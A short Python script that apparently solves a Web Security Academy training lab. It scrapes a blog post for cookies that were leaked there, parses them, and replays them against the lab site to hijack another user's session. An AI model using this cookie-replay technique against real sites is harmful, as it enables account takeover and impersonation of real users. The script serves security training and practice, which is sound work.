import requests
from bs4 import BeautifulSoup
import re

site = '0a39006203d4e7fe806f0338003d005b.web-security-academy.net'
s = requests.Session()

def extract_and_use_cookies():
    post_url = f'https://{site}/post?postId=1'
    resp = s.get(post_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    cookie_list = soup.find('p', text=re.compile('secret')).text.split(';')
    print("Extracted cookies:", cookie_list)

    cookie_dict = dict()
    for cookie in cookie_list:
        k, v = cookie.strip().split('=')
        cookie_dict[k] = v

    print("Cookie Dictionary:", cookie_dict)
    final_resp = s.get(f'https://{site}', cookies=cookie_dict)
    print("Final access status:", final_resp.status_code)

extract_and_use_cookies()